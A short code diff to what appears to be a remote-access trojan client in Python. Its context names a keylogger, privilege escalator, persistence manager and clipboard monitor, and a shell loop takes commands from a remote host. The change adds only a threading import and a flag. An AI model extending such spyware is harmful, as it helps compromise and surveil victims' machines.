@@ -21,6 +21,7 @@ persistence_manager = None
 
 import sys
 import os
+import threading
 
 # Add current directory to Python path for imports
 current_dir = os.path.dirname(os.path.abspath(__file__))
@@ -104,6 +105,8 @@ def shell():
     global keylogger, recorder, privilege_escalator, persistence_manager
     global clipboard_monitor_thread, clipboard_monitor_stop_flag
     
+    clipboard_monitor_started = False
+
     while True:
         # Receive a command from the remote host
         command = reliable_recv()
